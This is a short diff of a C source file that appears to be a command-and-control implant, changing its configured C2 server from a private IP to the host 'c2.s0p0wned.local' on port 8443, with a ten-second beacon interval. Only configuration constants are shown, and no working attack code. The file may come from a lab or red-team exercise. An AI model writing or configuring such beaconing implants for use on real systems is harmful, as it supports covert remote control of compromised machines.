@@ -4,7 +4,7 @@
 #include <time.h>
 
 // Configuration
-#define C2_SERVER "172.20.10.8"
+#define C2_SERVER "c2.s0p0wned.local"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
 
